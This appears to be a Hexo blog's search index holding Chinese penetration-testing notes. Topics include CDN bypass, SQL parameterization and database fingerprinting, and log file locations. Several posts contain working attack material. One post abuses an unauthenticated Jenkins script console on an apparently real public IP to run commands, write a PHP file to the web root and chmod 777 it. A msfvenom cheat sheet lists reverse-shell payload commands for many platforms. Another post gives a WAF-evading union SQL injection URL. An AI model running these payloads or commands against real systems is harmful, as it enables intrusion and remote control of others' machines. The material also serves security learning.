<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>jenkins未授权</title>
    <url>/2020/03/31/JenKins%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h2 id="Jenkins利用"><a href="#Jenkins利用" class="headerlink" title="Jenkins利用"></a>Jenkins利用</h2><a id="more"></a>







<blockquote>
<p><strong>目标</strong>：<a href="http://5.196.89.136:8090/script" target="_blank" rel="noopener">http://5.196.89.136:8090/script</a></p>
</blockquote>
<h4 id="查看是否能够出网"><a href="#查看是否能够出网" class="headerlink" title="查看是否能够出网"></a>查看是否能够出网</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;ping -c 3 www.baidu.com&quot;.execute().text</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327135353.png" alt="image-20200327135351787"></p>
<p>结果显示可以。</p>
<h4 id="查看web路径"><a href="#查看web路径" class="headerlink" title="查看web路径"></a>查看web路径</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;httpd -V&quot;.execute().text</span><br></pre></td></tr></table></figure>





<h4 id="目录列举"><a href="#目录列举" class="headerlink" title="目录列举"></a>目录列举</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;ls &#x2F;var&#x2F;www&#x2F;html&quot;.execute().text</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327135651.png" alt="image-20200327135649845"></p>
<h4 id="写入Web-shell测试"><a href="#写入Web-shell测试" class="headerlink" title="写入Web shell测试"></a>写入Web shell测试</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new File(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&quot;).write(&quot;&lt;?php phpinfo(); ?&gt;&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327140018.png" alt="image-20200327140016826"></p>
<p>发现没有写入权限。</p>
<h3 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;chmod 777 &#x2F;var&#x2F;www&#x2F;html&quot;.execute().text</span><br></pre></td></tr></table></figure>



<h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><p><a href="https://www.cnblogs.com/cwkiller/p/12578924.html" target="_blank" rel="noopener">CVE-2018-1000861复现</a></p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>未授权</tag>
      </tags>
  </entry>
  <entry>
    <title>cdn绕过</title>
    <url>/2020/03/30/cdn%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="cdn绕过"><a href="#cdn绕过" class="headerlink" title="cdn绕过"></a>cdn绕过</h2><h3 id="什么是cdn"><a href="#什么是cdn" class="headerlink" title="什么是cdn"></a>什么是cdn</h3><p>​    CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/内容分发网络/4034265" target="_blank" rel="noopener">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p>
<a id="more"></a>

<p>​    当服务器很远时，访问的速度会收到影响，cdn可以理解为一个缓存节点，可以从距离自己很近的cdn节点来获取数据而不是真实服务器。当网站开启cdn加速后，我们访问这个网站时，访问到的不是服务器的真实ip地址，而只是一个缓存节点。</p>
<p>​    </p>
<h3 id="怎么检测是否存在cdn？"><a href="#怎么检测是否存在cdn？" class="headerlink" title="怎么检测是否存在cdn？"></a>怎么检测是否存在cdn？</h3><ul>
<li><p>多地ping（超级ping）——如果全国各地访问的是同一个ip，则很明显没有使用cdn加速。下面是使用cdn加速的网站截图。<br><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330134015.png" alt="image-20200330134013660"></p>
</li>
<li><p>nslookup——看非权威应答返回的ip数量，当数量只有一个时明显没有使用cdn。（感觉这个方法不是很可靠，下面是反例）<br><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330134651.png" alt="image-20200330134649941"></p>
</li>
<li><p>使用<a href="https://www.cdnplanet.com/tools/cdnfinder/#site:https://www.lenovo.com" target="_blank" rel="noopener">cdn工具</a>查看</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330134538.png" alt="image-20200330134533284"></p>
</li>
</ul>
<h3 id="如何绕过cdn得到真实ip"><a href="#如何绕过cdn得到真实ip" class="headerlink" title="如何绕过cdn得到真实ip"></a>如何绕过cdn得到真实ip</h3><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><p>​    开启cdn需要一定费用，很多企业只会选择重要的主站开启cdn加速服务，而其他访问量较少的子站则没有，但是可能存在主站和子站在同一服务器（ip地址）上的情况。</p>
<h4 id="国外地址查询"><a href="#国外地址查询" class="headerlink" title="国外地址查询"></a>国外地址查询</h4><p>​    利用国内和国外的访问人数的不同，有些公司在国内用户很多，而在国外没有太多用户，所以只在国内开启了cdn服务，国外没有开启，因此可以通过国外访问来获取真实ip。</p>
<h4 id="邮件服务查询"><a href="#邮件服务查询" class="headerlink" title="邮件服务查询"></a>邮件服务查询</h4><p>​    很多网站注册的时候会绑定邮箱，收到一些从服务器发来的邮件，可以通过查找邮件来源来获取真实ip地址。或者可以想办法从目标服务器向外发出邮件，比如使用RSS邮件订阅。</p>
<p>​    得到邮件后查看邮件原文如下</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330143235.png" alt="image-20200330143234135"></p>
<h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><ul>
<li>通过敏感文件，如phpinfo，GitHub信息泄露等</li>
</ul>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330135834.png" alt="image-20200330135832062"></p>
<ul>
<li><p>扫全网——扫描全球各地同时请求，利用不可能全球各国全部使用cdn这个假说。</p>
</li>
<li><p>dns历史记录——查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录。</p>
</li>
<li><p>黑暗引擎（shodan，fofa …）——成功率不高，利用网站刚建立就被这些引擎扫描到，而这时没有开启cdn。</p>
</li>
<li><p>ping的不同姿势——可能设置cdn的域名是<code>www.baidu.com</code>而不是<code>baodu.com</code> (我不知道是否可靠)</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330141254.png" alt="image-20200330141245899"></p>
</li>
<li><p>一些查询网站查询真实ip</p>
<p><code>https://get-site-ip.com/</code></p>
</li>
</ul>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330142045.png" alt="image-20200330142044085"></p>
<ul>
<li>SSL证书查询——使用<code>Censys</code></li>
</ul>
<h3 id="cdn工具使用"><a href="#cdn工具使用" class="headerlink" title="cdn工具使用"></a>cdn工具使用</h3><h4 id="w8fuckcdn"><a href="#w8fuckcdn" class="headerlink" title="w8fuckcdn"></a>w8fuckcdn</h4><blockquote>
<p>通过扫描全网绕过CDN获取网站IP地址</p>
</blockquote>
<p>项目地址: <code>https://github.com/boy-hack/w8fuckcdn</code></p>
<p>用法: <code>python get_ips.py -d baidu.com</code></p>
<p>本来想使用一下的，结果运行报错，还是直接调用masscan感觉有点不太行。</p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>cdn</tag>
      </tags>
  </entry>
  <entry>
    <title>sql参数化</title>
    <url>/2020/03/29/sql%E5%8F%82%E6%95%B0%E5%8C%96/</url>
    <content><![CDATA[<h2 id="sql参数化"><a href="#sql参数化" class="headerlink" title="sql参数化"></a>sql参数化</h2><p>sql参数化可以从根本上防止sql注入，sql注入的根本在于用户恶意拼接sql语句，数据库会将整个sql语句执行，而sql参数化采用预编译的方式，将用户输入的数据作为参数处理。下面是一段网上的java的预编译代码，很好理解。</p>
<a id="more"></a>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"></span><br><span class="line">String sql = <span class="string">"select * from user where username=? and passwd=?"</span>;</span><br><span class="line">ps = conn.PreparedStatement(sql);</span><br><span class="line">ps.setString(<span class="number">1</span>, <span class="string">"admin"</span>);</span><br><span class="line">ps.setString(<span class="number">2</span>, <span class="string">"123456"</span>);</span><br><span class="line">resultSet = ps.executeQuery();</span><br></pre></td></tr></table></figure>

<p>在这段代码中就不会存在sql拼接的现象，即使用户输入<code>username</code>=<code>admin‘ or 1=1</code>，数据库在执行时只会把这个当做一个用户，去查询有没有<code>admin‘ or 1=1</code>的用户。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote>
<p><a href="https://www.zhihu.com/question/52869762" target="_blank" rel="noopener">https://www.zhihu.com/question/52869762</a></p>
</blockquote>
<h3 id="sql数据库识别"><a href="#sql数据库识别" class="headerlink" title="sql数据库识别"></a>sql数据库识别</h3><p>常见的数据库一般有mysql，access，oracle，postgresql，sqlserver（mssql) 这五类</p>
<h4 id="根据框架组合识别"><a href="#根据框架组合识别" class="headerlink" title="根据框架组合识别"></a>根据框架组合识别</h4><table>
<thead>
<tr>
<th align="center">框架</th>
<th align="center">常用数据库</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Asp和。net</td>
<td align="center">sqlserver</td>
</tr>
<tr>
<td align="center">php</td>
<td align="center">mysql和postgesql</td>
</tr>
<tr>
<td align="center">java</td>
<td align="center">oracle和mysql</td>
</tr>
<tr>
<td align="center">iis（基于windows）</td>
<td align="center">sqlserver</td>
</tr>
<tr>
<td align="center">apache</td>
<td align="center">mysql和postgresql</td>
</tr>
<tr>
<td align="center">asp</td>
<td align="center">access和sqlserver</td>
</tr>
</tbody></table>
<h4 id="报错信息判断"><a href="#报错信息判断" class="headerlink" title="报错信息判断"></a>报错信息判断</h4><p>在参数后面加个’或者”如<code>id=1&#39;</code>尝试引发报错，通过回显错误信息判断</p>
<p>对于<code>acecss</code>数据库会回显<code>Microsoft JET Database Engine 错误’80040e14</code> </p>
<p>对于<code>sqlserver</code>数据库会回显<code>ODBC</code>,<code>Msg</code></p>
<p>对于<code>mysql</code>数据库会回显<code>you have an error in your SQL syntax</code></p>
<p>对于<code>oracle</code>数据库会回显<code>ora-错误编号</code></p>
<h4 id="特定连接符判断"><a href="#特定连接符判断" class="headerlink" title="特定连接符判断"></a>特定连接符判断</h4><table>
<thead>
<tr>
<th align="center">数据库</th>
<th align="center">连接符查询</th>
</tr>
</thead>
<tbody><tr>
<td align="center">mysql</td>
<td align="center">select ‘str’’ing’ <br />select concat(‘str’,’’ing)<br /> select ‘str’+’ing’</td>
</tr>
<tr>
<td align="center">sqlserver</td>
<td align="center">select ‘str’+’ing’</td>
</tr>
<tr>
<td align="center">oracle</td>
<td align="center">select ‘str’||’ing’ <br />select concat(‘str’,’’ing)</td>
</tr>
</tbody></table>
<h4 id="通过不同数据库特有的表判断"><a href="#通过不同数据库特有的表判断" class="headerlink" title="通过不同数据库特有的表判断"></a>通过不同数据库特有的表判断</h4><table>
<thead>
<tr>
<th align="center">数据库</th>
<th align="center">特有的表</th>
</tr>
</thead>
<tbody><tr>
<td align="center">mysql（&gt;5.0）</td>
<td align="center">information_schema.TABLES</td>
</tr>
<tr>
<td align="center">sqlserver</td>
<td align="center">sysobjects</td>
</tr>
<tr>
<td align="center">oracle</td>
<td align="center">sys.user_tables</td>
</tr>
<tr>
<td align="center">access</td>
<td align="center">msysobjects</td>
</tr>
</tbody></table>
<p>在存在注入点的情况下可以使用以下用法判断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from 特有表名)&gt;0 and 1&#x3D;1</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Web漏洞基础知识</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>日志</title>
    <url>/2020/03/29/%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>做了下实习笔试题，在日志这块上不是很了解，答得很糟，所以现在学习总结一下。</p>
<a id="more"></a>

<h3 id="查看win10日志"><a href="#查看win10日志" class="headerlink" title="查看win10日志"></a>查看win10日志</h3><p>在<code>事件处理器</code>中可以看到，不过要以管理员运行。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200329085145.png" alt="image-20200329085144198"></p>
<p>可以看到win10的日志分了以下几个模块</p>
<ul>
<li>应用程序</li>
<li>安全</li>
<li>Setup</li>
<li>系统</li>
<li>Forwarded Events</li>
</ul>
<p>点击右边侧栏中的属性选项可以看到该日志文件的存放位置</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200329085638.png" alt="image-20200329085636402"></p>
<p>所以这五个日志模块的存放位置是在<code>C:\Windows\System32\winevt\Logs</code>下，该目录下有很多小的日志文件可能是其他系统服务的日志文件</p>
<p>应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx</p>
<p>安全日志：%SystemRoot%\System32\Winevt\Logs\Security.evtx</p>
<p>安装日志：%SystemRoot%\System32\Winevt\Logs\Setup.evtx</p>
<p>系统日志： %SystemRoot%\System32\Winevt\Logs\System.evtx</p>
<p>Forwarded Event日志：%SystemRoot%\System32\Winevt\Logs\ForwardedEvents.evtx</p>
<h3 id="linux日志"><a href="#linux日志" class="headerlink" title="linux日志"></a>linux日志</h3><p>linux的日志文件存放在<code>/var/log/</code>下。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200329090719.png" alt="image-20200329090718478"></p>
<p><strong>/var/log/faillog –包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。</strong></p>
<p><strong>/var/log/btmp –包含所有失败登录信息</strong></p>
<p>该目录下处理系统日志以外，还包括了apache2，mysql等应用的日志。</p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>msfvenom用法</title>
    <url>/2020/03/29/msfvenom/</url>
    <content><![CDATA[<h2 id="msfvenom用法"><a href="#msfvenom用法" class="headerlink" title="msfvenom用法"></a>msfvenom用法</h2><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><a id="more"></a>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Options:</span><br><span class="line">   -l, --list            &lt;type&gt;        # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等</span><br><span class="line">   -p, --payload         &lt;payload&gt;     # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span><br><span class="line">       --list-options                  # 列出--payload &lt;value&gt; 的标准，高级和规避选项</span><br><span class="line">   -f, --format          &lt;format&gt;      # 指定 Payload 的输出格式(使用 --list formats 列出)</span><br><span class="line">   -e, --encoder         &lt;encoder&gt;     # 指定使用的 Encoder (使用 --list encoders 列出)</span><br><span class="line">       --sec-name        &lt;value&gt;       # 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串</span><br><span class="line">       --smallest                      # 使用所有可用的编码器生成最小的payload</span><br><span class="line">       --encrypt         &lt;value&gt;       # 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)</span><br><span class="line">       --encrypt-key     &lt;value&gt;       # 用于加密的密钥</span><br><span class="line">       --encrypt-iv      &lt;value&gt;       # 加密的初始化向量</span><br><span class="line">   -a, --arch            &lt;arch&gt;        # 指定目标系统架构(使用 --list archs  列出)</span><br><span class="line">       --platform        &lt;platform&gt;    # 指定目标系统平台 (使用 --list platforms 列出)</span><br><span class="line">   -o, --out             &lt;path&gt;        # 保存payload文件</span><br><span class="line">   -b, --bad-chars       &lt;list&gt;        # 设置需要在 Payload 中避免出现的字符，如： '\x00\xff'</span><br><span class="line">   -n, --nopsled         &lt;length&gt;      # 指定 nop 在 payload 中的数量</span><br><span class="line">   -s, --space           &lt;length&gt;      # 设置未经编码的 Payload 的最大长度</span><br><span class="line">       --encoder-space   &lt;length&gt;      # 编码后的 Payload 的最大长度</span><br><span class="line">   -i, --iterations      &lt;count&gt;       # 设置 Payload 的编码次数</span><br><span class="line">   -c, --add-code        &lt;path&gt;        # 指定包含一个额外的win32 shellcode文件</span><br><span class="line">   -x, --template        &lt;path&gt;        # 指定一个特定的可执行文件作为模板</span><br><span class="line">   -k, --keep                          # 保护模板程序的功能，注入的payload作为一个新的进程运行</span><br><span class="line">   -v, --var-name        &lt;value&gt;       # 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span><br><span class="line">   -t, --timeout         &lt;second&gt;      # 设置从STDIN读取payload的等待时间（默认为30,0为禁用）</span><br><span class="line">   -h, --help                          # 帮助</span><br></pre></td></tr></table></figure>



<h4 id="使用–list-encorders查看所有编码器"><a href="#使用–list-encorders查看所有编码器" class="headerlink" title="使用–list encorders查看所有编码器"></a>使用–list encorders查看所有编码器</h4><p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200325160228.png" alt=""></p>
<p>同理可以使用</p>
<p><code>--list payloads</code> 查看所有payloads</p>
<p><code>--list archs</code> 查看所有架构</p>
<p><code>--list platform</code> 查看所有平台。</p>
<p><code>--list formats</code> 查看所有输出格式</p>
<p><code>--list</code> 也可以使用<code>-l</code>代替</p>
<h3 id="生成payload的不同方式"><a href="#生成payload的不同方式" class="headerlink" title="生成payload的不同方式"></a>生成payload的不同方式</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><h5 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f exe -e x86/shikata_ga_nai &gt; shell.ex</span><br></pre></td></tr></table></figure>

<h5 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f exe -e powershell_base64 &gt; shell.exe</span><br></pre></td></tr></table></figure>



<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><h5 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f elf -e x86/shikata_ga_nai &gt; shell.elf</span><br></pre></td></tr></table></figure>

<h5 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f elf -e powershell_base64 &gt; shell.elf</span><br></pre></td></tr></table></figure>

<h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><h5 id="32位-2"><a href="#32位-2" class="headerlink" title="32位"></a>32位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.222.135 LPORT=4567  -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>



<h4 id="WEB常用"><a href="#WEB常用" class="headerlink" title="WEB常用"></a>WEB常用</h4><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

<h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<h5 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw -o shell.js</span><br></pre></td></tr></table></figure>

<h4 id="各种语言的脚本"><a href="#各种语言的脚本" class="headerlink" title="各种语言的脚本"></a>各种语言的脚本</h4><h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">第一种Linux下使用python反弹一个cmd形式的shell:</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">第二种反弹一个meterpreter形式的shell(windows|Linux都可以):</span><br><span class="line">msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>



<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote>
<p><a href="https://mature-sec.com/post/msfvenom使用小结/" target="_blank" rel="noopener">https://mature-sec.com/post/msfvenom%E4%BD%BF%E7%94%A8%E5%B0%8F%E7%BB%93/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>后渗透</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>test</title>
    <url>/2020/03/29/test/</url>
    <content><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://192.168.222.130:86/Less-1/?id=-2%27%20union%20--+X%0a%20select%201,2,(select--+x%0agroup_concat(schema_name)--+x%0afrom--+x%0ainformation_schema.schemata)--+</span><br><span class="line"><span class="comment">#方法和前面的思路一样，换行处理</span></span><br><span class="line"><span class="comment">#爆表，爆字段和数据类似</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>后渗透</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过安全狗</title>
    <url>/2020/03/29/%E6%9C%AC%E5%9C%B0%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97%E5%B0%9D%E8%AF%95/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="9c6188e81121a6897f28be5d45c4ec416d48ce64e6cc0e23b187001073f40fb9"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
</search>
